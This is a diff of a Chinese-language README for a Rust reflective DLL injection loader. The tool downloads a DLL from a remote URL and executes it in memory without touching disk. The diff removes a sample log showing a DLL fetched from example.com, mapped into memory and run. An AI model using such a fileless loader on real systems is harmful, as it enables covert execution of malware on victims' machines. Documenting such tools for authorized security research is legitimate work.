@@ -1,4 +1,4 @@
-# Rust RDI Loader - 反射式DLL注入工具 (Rust版本)
+# Rust RDI Loader
 
 一个使用 Rust 实现的反射式DLL注入（Reflective DLL Injection）工具，支持从远程URL下载DLL并在内存中执行，无需文件落地。
 
@@ -149,48 +149,6 @@ rust-rdi/
 特点: 静态链接，独立运行
 ```
 
-## 📝 示例输出
-
-```
-=== RDI (Reflective DLL Injection) Loader - Rust Version ===
-警告：此工具仅应用于授权的安全测试和研究
-
-URL from command line: http://example.com/test.dll
-
-正在下载DLL...
-[*] Parsed URL - Host: example.com, Port: 80, Path: /test.dll
-[+] Downloaded 102400 bytes
-
-[*] Starting PE parsing...
-[+] DOS header valid
-[+] NT header valid
-[+] Architecture matches
-[*] Image Base: 0x180000000
-
-正在加载DLL到内存...
-[*] Image Size: 196608 bytes
-[+] Allocated 196608 bytes at 0x7FF123450000
-[+] Headers copied
-
-[*] Loading sections...
-[+] Loaded section: .text
-[+] Loaded section: .data
-
-[*] Processing import table...
-[*] Loading library: KERNEL32.dll
-[+] Resolved 45 functions from 2 libraries
-[*] Applying relocations (delta: 0x7F123450000)...
-[+] Relocations applied
-
-DLL加载成功!
-
-正在执行DLL...
-Entry point: 0x7FF123451000
-DLL执行成功!
-
-按Enter键退出...
-```
-
 ## 🛠️ 开发
 
 ### 依赖说明
@@ -235,3 +193,4 @@ cargo build --release --target x86_64-pc-windows-msvc
 ---
 
 **⚠️ 重要提醒：合法使用，后果自负！**
+
